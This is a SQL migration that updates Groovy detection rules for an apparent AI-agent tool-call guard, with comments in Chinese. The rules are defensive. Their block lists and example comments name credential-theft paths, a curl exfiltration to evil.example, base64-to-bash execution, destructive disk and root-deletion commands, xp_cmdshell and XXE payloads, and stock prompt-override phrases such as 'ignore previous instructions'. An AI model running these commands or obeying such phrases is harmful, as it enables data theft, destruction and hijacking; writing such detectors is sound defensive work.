-- V33: default-rule readability pass (mirror of seed.sql).
--
-- Zero schema change; rule bodies only. Applying the readability convention:
--   * fixed 4-line header comment (intent / hits / non-hits(FP) / maintainer+date)
--   * named condition families instead of one long `||` chain
--   * slashy regexes written with single backslashes (the earlier V29 body used
--     `\\b` / `\\w`, which is dead code in Groovy slashy strings; this also
--     removes the fresh-seed vs migration-chain divergence for xp_/sp_ matching)
-- Semantics are unchanged otherwise. Existing rule_id values are frozen on
-- purpose: they are referenced by engine code and audit rows.
-- In-place update (no revision bump), per the standing default-rule procedure.

UPDATE tb_rule_history
SET body_json = 'def decide(ctx) {
    // cloud_sensitive_resource_deny — 凭证 / 敏感资源访问拦截
    // 命中: cat ~/.ssh/id_rsa | 读取 .aws/credentials | 请求 169.254.169.254
    // 不命中(防误报): README.md | /home/u/workdir/app.py | 普通日志文件
    // 维护: virbius default rules 2026-10-22
    // 仅 tool_call 平面（资源路径语义不套用到 chat 内容）
    def role = ctx.var("role")
    if (role != null && role != "tool_call") {
        return false
    }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") {
        return false
    }
    def content = ctx.var("content")
    if (content == null || content.isBlank()) {
        return false
    }
    def text = content.toLowerCase()
    // SSH 私钥
    def sshKeys = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"]
    // 云厂商 / 包管理器凭据与令牌文件
    def credFiles = [".aws/credentials", ".aws/config", ".config/gcloud", ".kube/config",
        ".docker/config.json", ".git-credentials", ".netrc", ".npmrc", ".pypirc",
        ".azure/", ".gnupg/", "wallet.dat", "service_account.json", "service-account.json",
        "credentials.json"]
    // 系统敏感文件（影子口令 / 提权配置 / 进程环境）
    def systemFiles = ["/etc/shadow", "/etc/sudoers", "/proc/self/environ"]
    // 云元数据端点与容器运行时 socket
    def metadata = ["169.254.169.254", "169.254.170.2", "metadata.google.internal",
        "metadata.azure.com", "/var/run/docker.sock", "/run/containerd/containerd.sock"]
    def markers = sshKeys + credFiles + systemFiles + metadata
    if (markers.any { text.contains(it) }) {
        ctx.setIntent("deny")
        return true
    }
    return false
}',
    modified_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'cloud_sensitive_resource_deny'
  AND rule_revision = (
      SELECT current_revision FROM tb_rules_current
      WHERE tenant_id = 'default' AND rule_id = tb_rule_history.rule_id
  );

UPDATE tb_rules_current
SET updated_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'cloud_sensitive_resource_deny';

UPDATE tb_rule_history
SET body_json = 'def decide(ctx) {
    // chain-exfil — 读敏感路径 → 外发非内部主机
    // 命中: read_file /etc/shadow 后 curl http://evil.example/collect
    // 不命中(防误报): 读 workdir 文件 → 调用内网 API（isInternalHost 放行）
    // 维护: virbius default rules 2026-10-22
    // 回溯最近 5 步会话历史 + 本次调用，识别 读→外发 两步链
    def readTools = ["read_file", "cat", "read", "get_file", "download", "list_dir"]
    def netTools = ["curl", "http_get", "http_post", "fetch", "webhook_call", "wget", "request"]
    def sensitive = ["/etc/", "/root/", "/.ssh", "id_rsa", ".env", "credentials", "secret", "/var/"]
    def seq = []
    def h = ctx.sessionHistory(5)
    for (int i = h.size() - 1; i >= 0; i--) {
        seq.add(h[i])
    }
    seq.add([tool_name: ctx.var("tool_name"), args: ctx.var("content")])
    if (seq.size() > 5) {
        seq = seq.subList(seq.size() - 5, seq.size())
    }
    def step = 0
    for (def e : seq) {
        def t = e.tool_name?.toString()
        def a = (e.args ?: "").toString().toLowerCase()
        // 第 1 步：读取敏感路径
        if (step == 0 && t != null && readTools.contains(t) && sensitive.any { a.contains(it) }) {
            step = 1
        // 第 2 步：外发到非内部主机
        } else if (step == 1 && t != null && netTools.contains(t)) {
            def i = a.indexOf("http")
            if (i >= 0) {
                def rest = a.substring(i)
                def end = rest.indexOf(34)
                def url = end > 0 ? rest.substring(0, end) : rest
                if (!ctx.isInternalHost(url)) {
                    step = 2
                }
            }
        }
    }
    return step == 2
}',
    modified_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'chain-exfil'
  AND rule_revision = (
      SELECT current_revision FROM tb_rules_current
      WHERE tenant_id = 'default' AND rule_id = tb_rule_history.rule_id
  );

UPDATE tb_rules_current
SET updated_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'chain-exfil';

UPDATE tb_rule_history
SET body_json = 'def decide(ctx) {
    // chain-write-exec — 写文件 → 执行
    // 命中: write_file /tmp/x.sh 后 exec_cmd "bash /tmp/x.sh"
    // 不命中(防误报): 只写不执行 | 只执行不写
    // 维护: virbius default rules 2026-10-22
    // 回溯最近 6 步会话历史 + 本次调用，识别 写→执行 两步链
    def writeTools = ["write_file", "delete_file", "rm", "mv", "cp", "truncate", "edit_file", "db_write"]
    def execTools = ["exec_cmd", "shell", "bash", "sh", "execute_python", "run_command", "subprocess"]
    def seq = []
    def h = ctx.sessionHistory(6)
    for (int i = h.size() - 1; i >= 0; i--) {
        seq.add(h[i])
    }
    seq.add([tool_name: ctx.var("tool_name"), args: ctx.var("content")])
    if (seq.size() > 6) {
        seq = seq.subList(seq.size() - 6, seq.size())
    }
    def step = 0
    for (def e : seq) {
        def t = e.tool_name?.toString()
        // 第 1 步：写入 / 改写
        if (step == 0 && t != null && writeTools.contains(t)) {
            step = 1
        // 第 2 步：执行
        } else if (step == 1 && t != null && execTools.contains(t)) {
            step = 2
        }
    }
    return step == 2
}',
    modified_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'chain-write-exec'
  AND rule_revision = (
      SELECT current_revision FROM tb_rules_current
      WHERE tenant_id = 'default' AND rule_id = tb_rule_history.rule_id
  );

UPDATE tb_rules_current
SET updated_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'chain-write-exec';

UPDATE tb_rule_history
SET body_json = 'def decide(ctx) {
    // chain-priv-esc — 读 → 写 → 执行 三步提权链
    // 命中: read_file /etc/passwd → write_file /etc/sudoers.d/x → exec_cmd
    // 不命中(防误报): 纯读 | 纯写 | 读→执行（不经过写）
    // 维护: virbius default rules 2026-10-22
    // 回溯最近 8 步会话历史 + 本次调用
    def readTools = ["read_file", "cat", "read", "get_file", "download", "list_dir"]
    def writeTools = ["write_file", "delete_file", "rm", "mv", "cp", "truncate", "edit_file", "db_write"]
    def execTools = ["exec_cmd", "shell", "bash", "sh", "execute_python", "run_command", "subprocess"]
    def seq = []
    def h = ctx.sessionHistory(8)
    for (int i = h.size() - 1; i >= 0; i--) {
        seq.add(h[i])
    }
    seq.add([tool_name: ctx.var("tool_name"), args: ctx.var("content")])
    if (seq.size() > 8) {
        seq = seq.subList(seq.size() - 8, seq.size())
    }
    def step = 0
    for (def e : seq) {
        def t = e.tool_name?.toString()
        if (step == 0 && t != null && readTools.contains(t)) {
            step = 1
        } else if (step == 1 && t != null && writeTools.contains(t)) {
            step = 2
        } else if (step == 2 && t != null && execTools.contains(t)) {
            step = 3
        }
    }
    return step == 3
}',
    modified_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'chain-priv-esc'
  AND rule_revision = (
      SELECT current_revision FROM tb_rules_current
      WHERE tenant_id = 'default' AND rule_id = tb_rule_history.rule_id
  );

UPDATE tb_rules_current
SET updated_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'chain-priv-esc';

UPDATE tb_rule_history
SET body_json = 'def decide(ctx) {
    // retry-escape — 被拦后换 tool / 换参数重试（规避检测）
    // 命中: exec_cmd 被拦后 3 步内改用 shell 或改写参数重试
    // 不命中(防误报): 连续 3 次正常放行（wash-out 洗白）| 拦后不足 3 步
    // 维护: virbius default rules 2026-10-22
    // 近 10 步会话历史内的最后拦截点 → 之后的变化尝试
    def h = ctx.sessionHistory(10)
    def attempts = []
    for (int i = h.size() - 1; i >= 0; i--) {
        attempts.add(h[i])
    }
    if (attempts.size() > 10) {
        attempts = attempts.subList(attempts.size() - 10, attempts.size())
    }
    def lastBlock = -1
    for (int i = 0; i < attempts.size(); i++) {
        if (attempts[i].allowed == false) {
            lastBlock = i
        }
    }
    if (lastBlock < 0) {
        return false
    }
    def blocked = attempts[lastBlock]
    // wash-out：拦后已连续 3 次正常放行则不再视为重试
    def trailing = 0
    for (int i = attempts.size() - 1; i > lastBlock; i--) {
        if (attempts[i].allowed != false) {
            trailing++
        } else {
            break
        }
    }
    if (trailing >= 3) {
        return false
    }
    def after = []
    after.addAll(attempts.subList(lastBlock + 1, attempts.size()))
    after.add([tool_name: ctx.var("tool_name"), args: ctx.var("content")])
    if (after.size() < 3) {
        return false
    }
    def bTool = blocked.tool_name?.toString()
    def bArgs = (blocked.args ?: "").toString()
    // 换 tool 或换参数均算变化尝试
    return after.any {
        def t = it.tool_name?.toString()
        def a = (it.args ?: "").toString()
        (t != null && t != bTool) || a != bArgs
    }
}',
    modified_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'retry-escape'
  AND rule_revision = (
      SELECT current_revision FROM tb_rules_current
      WHERE tenant_id = 'default' AND rule_id = tb_rule_history.rule_id
  );

UPDATE tb_rules_current
SET updated_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'retry-escape';

UPDATE tb_rule_history
SET body_json = 'def decide(ctx) {
    // cloud_encoded_exec_deny — 编码载荷解码 + 执行引信
    // 命中: echo <b64> | base64 -d | bash | python -c exec(base64.b64decode(...))
    // 不命中(防误报): base64 -d 到文件 | tar/gzip 解压归档 | openssl 解密落盘
    // 维护: virbius default rules 2026-10-22
    // 仅 tool_call 平面
    def role = ctx.var("role")
    if (role != null && role != "tool_call") {
        return false
    }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") {
        return false
    }
    def content = ctx.var("content")
    if (content == null || content.isBlank()) {
        return false
    }
    def text = content.toLowerCase()
    // 解码器
    def b64 = text.contains("base64 -d") || text.contains("base64 --decode")
    def gz = text.contains("gzip -d") || text.contains("gunzip")
    def ossl = text.contains("openssl") && text.contains("enc") && text.contains("-d")
    // 执行引信（shell 管道 / 解释器 / 脚本宿主）
    def shell = text.contains("| bash") || text.contains("| sh") || text.contains("bash -c")
    def py = text.contains("exec(base64.b64decode") || (text.contains("b64decode") && (text.contains("exec(") || text.contains("eval(")))
    def ps = text.contains("powershell") && text.contains("-enc")
    def cert = text.contains("certutil") && text.contains("-decode")
    def xxd = text.contains("xxd -r") && (text.contains("| sh") || text.contains("| bash"))
    def js = text.contains("frombase64string") || (text.contains("atob(") && text.contains("eval("))
    def pl = text.contains("mime::base64") && (text.contains("system(") || text.contains("eval("))
    return ((b64 || gz) && shell) || py || (ossl && shell) || pl || ps || cert || xxd || js
}',
    modified_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'cloud_encoded_exec_deny'
  AND rule_revision = (
      SELECT current_revision FROM tb_rules_current
      WHERE tenant_id = 'default' AND rule_id = tb_rule_history.rule_id
  );

UPDATE tb_rules_current
SET updated_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'cloud_encoded_exec_deny';

UPDATE tb_rule_history
SET body_json = 'def decide(ctx) {
    // cloud_destructive_command_deny — 不可逆破坏性命令拦截
    // 命中: rm -rf / --no-preserve-root | mkfs.ext4 /dev/sda | dd of=/dev/nvme0n1
    // 不命中(防误报): rm -rf /tmp | dd of=/tmp/img | find workdir -delete
    // 维护: virbius default rules 2026-10-22
    // 仅 tool_call 平面
    def role = ctx.var("role")
    if (role != null && role != "tool_call") {
        return false
    }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") {
        return false
    }
    def content = ctx.var("content")
    if (content == null || content.isBlank()) {
        return false
    }
    def text = content.toLowerCase()
    // 删根（白名单常见临时目录，避免误伤构建清理）
    def rmRoot = text.contains("rm -rf /") && !text.contains("rm -rf /tmp") && !text.contains("rm -rf /home") && !text.contains("rm -rf /var/tmp") && !text.contains("rm -rf /users")
    // 裸盘设备族 + 写入方向（dd of= / 重定向）
    def diskFam = text.contains("/dev/sd") || text.contains("/dev/nvme") || text.contains("/dev/vd") || text.contains("/dev/hd") || text.contains("/dev/mapper") || text.contains("/dev/disk")
    def diskWrite = text.contains("shred") && text.contains("/dev/")
    diskWrite = diskWrite || ((text.contains("of=") || text.contains("> /dev/") || text.contains(">> /dev/")) && diskFam)
    // 未命名破坏面：格式化 / 零写盘 / 根域删除扫描 / 关机 / fork 炸弹 / 权限放开
    def named = text.contains("--no-preserve-root")
        || text.contains("mkfs")
        || text.contains("dd if=/dev/zero of=/dev/")
        || (text.contains("-delete") && text.contains("find / "))
        || text.contains("shutdown -h")
        || text.contains("shutdown now")
        || text.contains(":(){ :|:& };:")
        || text.contains("chmod -r 777 /")
    return rmRoot || diskWrite || named
}',
    modified_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'cloud_destructive_command_deny'
  AND rule_revision = (
      SELECT current_revision FROM tb_rules_current
      WHERE tenant_id = 'default' AND rule_id = tb_rule_history.rule_id
  );

UPDATE tb_rules_current
SET updated_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'cloud_destructive_command_deny';

UPDATE tb_rule_history
SET body_json = 'def decide(ctx) {
    // cloud_session_risk_escalation — 会话风险分阶梯动作（管理面兜底）
    // 命中: 会话风险累积 ≥85 → deny；≥60 → challenge
    // 不命中(防误报): 单次低风险调用（风险分未达阈值）
    // 维护: virbius default rules 2026-10-22
    // 风险分由多维加权 + 时间衰减管理器累积，这里只做阈值映射
    def risk = ctx.sessionRiskScore()
    if (risk != null && risk >= 85) {
        ctx.setIntent("deny")
        return true
    }
    if (risk != null && risk >= 60) {
        ctx.setIntent("challenge")
        return true
    }
    return false
}',
    modified_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'cloud_session_risk_escalation'
  AND rule_revision = (
      SELECT current_revision FROM tb_rules_current
      WHERE tenant_id = 'default' AND rule_id = tb_rule_history.rule_id
  );

UPDATE tb_rules_current
SET updated_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'cloud_session_risk_escalation';

UPDATE tb_rule_history
SET body_json = 'def decide(ctx) {
    // cloud_injection_marker_deny — 注入 marker（隐形字符 / 模板伪造 / 覆盖指令）
    // 命中: 执行参数含 U+200B 零宽字符 | <|im_start|>system | ignore previous instructions
    // 不命中(防误报): 正常多语言文本 | <|im_end|> 作为普通示例讲解（chat 角色不套用）
    // 维护: virbius default rules 2026-10-22
    // 仅 tool_call 平面（执行参数里的隐写/伪造才具备攻击面）
    def role = ctx.var("role")
    if (role != null && role != "tool_call") {
        return false
    }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") {
        return false
    }
    def content = ctx.var("content")
    if (content == null || content.isBlank()) {
        return false
    }
    def text = content.toLowerCase()
    // 族 1：隐形 Unicode（零宽 200B-F / BOM FEFF / 双向覆盖 202A-E / 隔离符 2066-9 /
    // 软连字符 00AD / 词连接符 2060）。206A-F 与 CJK 填充字符为防误报有意剔除。
    def invisible = false
    def cit = content.codePoints().iterator()
    while (cit.hasNext()) {
        def cp = cit.next()
        if ((cp >= 0x200b && cp <= 0x200f) || cp == 0xfeff || (cp >= 0x202a && cp <= 0x202e) || (cp >= 0x2066 && cp <= 0x2069) || cp == 0x00ad || cp == 0x2060) {
            invisible = true
            break
        }
    }
    // 族 2：chat 模板伪造分隔符
    def forge = text.contains("<|im_start|>") || text.contains("<|im_end|>") || text.contains("<|im_start|>system") || text.contains("<|im_end|>system") || text.contains("<<SYS>>") || text.contains("SYS>>") || text.contains("[inst]") || text.contains("[/inst]") || text.contains("### system") || text.contains("### instruction") || text.contains("### override") || text.contains("end system") || text.contains("begin user")
    // 族 3：高精度覆盖直译（18 条，宁缺毋滥）
    def override = text.contains("ignore previous instructions") || text.contains("ignore all previous instructions") || text.contains("ignore the previous instructions") || text.contains("disregard previous instructions") || text.contains("disregard all previous") || text.contains("forget all previous") || text.contains("forget everything you") || text.contains("forget your instructions") || text.contains("you have no restrictions") || text.contains("you have no limitations") || text.contains("you have no rules") || text.contains("developer mode enabled") || text.contains("developer mode override") || text.contains("dan mode enabled") || text.contains("act as if you have no") || text.contains("your true purpose is") || text.contains("the real system prompt is") || text.contains("actually your real instructions are")
    return invisible || forge || override
}',
    modified_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'cloud_injection_marker_deny'
  AND rule_revision = (
      SELECT current_revision FROM tb_rules_current
      WHERE tenant_id = 'default' AND rule_id = tb_rule_history.rule_id
  );

UPDATE tb_rules_current
SET updated_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'cloud_injection_marker_deny';

UPDATE tb_rule_history
SET body_json = 'def decide(ctx) {
    // cloud_sql_command_deny — 高危 SQL 面（提权/导出/管理命令）
    // 命中: EXEC xp_cmdshell | SELECT ... INTO OUTFILE | DROP TABLE users
    // 不命中(防误报): 普通 SELECT/INSERT/UPDATE | 裸 EXEC | CREATE INDEX
    // 维护: virbius default rules 2026-10-22
    // 仅 tool_call 平面
    def role = ctx.var("role")
    if (role != null && role != "tool_call") {
        return false
    }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") {
        return false
    }
    def content = ctx.var("content")
    if (content == null || content.isBlank()) {
        return false
    }
    def text = content.toLowerCase()
    // 族 1：存储过程 / 扩展过程提权（xp_ / sp_ 家族，slashy 正则用单反斜杠）
    def procEsc = (text =~ /\bxp_\w+/).find() || (text =~ /\bsp_\w+/).find() || text.contains("xp_cmdshell") || text.contains("dbcc") || text.contains("xpcmdshell")
    // 族 2：文件导出 / 外读 / 批量导入通道
    def dumpLoad = text.contains("into outfile") || text.contains("into dumpfile") || text.contains("load_file(") || text.contains("load data ") || text.contains("bulk insert ") || text.contains("openrowset") || text.contains("opendatasource") || text.contains("openquery")
    // 族 3：会话/实例级管理面
    def sqlAdmin = text.contains("set global ") || text.contains("set role ") || text.contains("create extension")
    // 族 4：破坏性 DDL / 权限放开
    def sqlWrite = text.contains("drop table ") || text.contains("drop database ") || text.contains("drop schema ") || text.contains("truncate table ") || text.contains("grant all ") || text.contains(" with grant option")
    return procEsc || dumpLoad || sqlAdmin || sqlWrite
}',
    modified_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'cloud_sql_command_deny'
  AND rule_revision = (
      SELECT current_revision FROM tb_rules_current
      WHERE tenant_id = 'default' AND rule_id = tb_rule_history.rule_id
  );

UPDATE tb_rules_current
SET updated_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'cloud_sql_command_deny';

UPDATE tb_rule_history
SET body_json = 'def decide(ctx) {
    // cloud_payload_injection_deny — 载荷注入 marker（XXE / Mongo 服务端 JS / Python 动态导入）
    // 命中: <!ENTITY xxe SYSTEM "file:///etc/passwd" | {$where: "..."} | __import__("os")
    // 不命中(防误报): 普通 <!DOCTYPE html> | Mongo $gt/$ne 查询 | import math
    // 维护: virbius default rules 2026-10-22
    // 仅 tool_call 平面
    def role = ctx.var("role")
    if (role != null && role != "tool_call") {
        return false
    }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") {
        return false
    }
    def content = ctx.var("content")
    if (content == null || content.isBlank()) {
        return false
    }
    def text = content.toLowerCase()
    // 族 1：XXE（外部实体 / 外部 DTD，须带 SYSTEM）
    def xxe = text.contains("<!entity") || (text =~ /<!doctype\s+[\w-]+\s+system/).find()
    // 族 2：Mongo 服务端 JS 算子（等效 xp_cmdshell 层）
    def nosqlJs = (text =~ /\$(where|function|accumulator)\s*:/).find()
    // 族 3：Python 动态导入执行
    def pyDyn = text.contains("__import__(")
    return xxe || nosqlJs || pyDyn
}',
    modified_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'cloud_payload_injection_deny'
  AND rule_revision = (
      SELECT current_revision FROM tb_rules_current
      WHERE tenant_id = 'default' AND rule_id = tb_rule_history.rule_id
  );

UPDATE tb_rules_current
SET updated_at = CURRENT_TIMESTAMP
WHERE tenant_id = 'default'
  AND rule_id = 'cloud_payload_injection_deny';

